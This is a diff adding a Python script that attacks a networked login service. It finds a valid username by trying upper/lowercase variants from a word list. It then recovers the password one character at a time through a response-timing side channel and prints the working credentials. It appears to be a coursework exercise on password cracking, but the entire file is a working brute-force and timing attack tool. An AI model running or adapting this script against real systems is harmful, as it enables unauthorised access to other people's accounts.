@@ -1,0 +1,66 @@
+from sys import argv
+from socket import socket
+import itertools
+import json
+from datetime import datetime
+
+
+class Hacking:
+    def __init__(self):
+        self.address = (argv[1], int(argv[2]))
+        self.client = socket()
+        self.client.connect(self.address)
+        self.characters_2 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        self.login = ""
+        self.password = []
+
+    def menu(self):
+        self.login_search()
+        print(self.password_search())
+
+    def login_search(self):
+        with open("logins.txt", "r", encoding="utf-8") as log_database:
+            for login in log_database:
+                s = map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in login)))
+                for i in s:
+                    guess = i.strip("\n")
+                    password = " "
+                    full_data = {"login": str(guess), "password": str(password)}
+                    json_str = json.dumps(full_data)
+                    json_str_2 = json_str.encode()
+                    self.client.send(json_str_2)
+                    response = json.loads(self.client.recv(1024).decode())
+                    if "Wrong login!" in response.values():
+                        continue
+                    elif "Wrong password!" in response.values():
+                        self.login = guess
+                        return ""
+
+    def password_search(self):
+        response = ""
+        while True:
+            for i in self.characters_2:
+                temp = "".join(self.password)
+                temp = temp + i
+                full_data = {"login": self.login, "password": temp}
+                json_str = json.dumps(full_data)
+                json_str_2 = json_str.encode()
+                self.client.send(json_str_2)
+                start = datetime.now()
+                response = json.loads(self.client.recv(1024).decode())
+                finish = datetime.now()
+                difference = finish - start
+                with open("check.txt", "w", encoding="utf-8") as just_for_check:
+                    just_for_check.write(response["result"])
+                if "Wrong password!" in response.values() and difference.microseconds >= 90000:
+                    self.password.append(i)
+                elif "Connection success!" in response.values():
+                    print(json_str)
+                    self.client.close()
+                    exit()
+                else:
+                    continue
+
+if __name__ == "__main__":
+    hack_bot = Hacking()
+    hack_bot.menu()
